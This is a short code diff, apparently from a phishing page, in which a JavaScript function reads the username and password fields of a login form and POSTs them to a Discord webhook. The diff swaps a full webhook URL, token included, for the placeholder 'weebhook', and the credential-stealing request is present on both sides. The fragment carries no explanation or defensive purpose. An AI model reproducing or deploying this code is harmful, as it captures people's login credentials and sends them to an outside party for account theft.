@@ -12,7 +12,7 @@ function la(src) {
     }
   
     var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1256739195024703599/lSo3CPfNzJwNxvienpvGypgMXsylgWvse1pZXFkrNcj6NdRZXTnwjw_FNMa-ET05AZlb");
+    request.open("POST", "weebhook");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
